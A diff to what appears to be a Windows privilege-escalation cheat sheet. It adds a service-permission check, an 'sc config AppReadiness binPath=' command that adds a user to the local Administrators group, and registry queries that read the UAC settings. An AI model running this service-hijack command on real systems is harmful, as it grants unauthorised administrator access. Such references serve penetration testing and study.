@@ -2398,6 +2398,8 @@ C:\> sc.exe sdshow <service>
 C:\> sc query <service>
 C:\> sc stop <service>
 C:\> sc start <service>
+C:\> PsService.exe security AppReadiness
+C:\> sc config AppReadiness binPath= "cmd /c net localgroup Administrators <username> /add"
 ```
 
 - Registry
@@ -3759,6 +3761,13 @@ PS C:\> Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\Syste
 
 ```
 PS C:\> $ExecutionContext.SessionState.LanguageMode
+```
+
+- View UAC
+
+```
+C:\> reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
+C:\> reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
 ```
 
 - Downgrade PowerShell
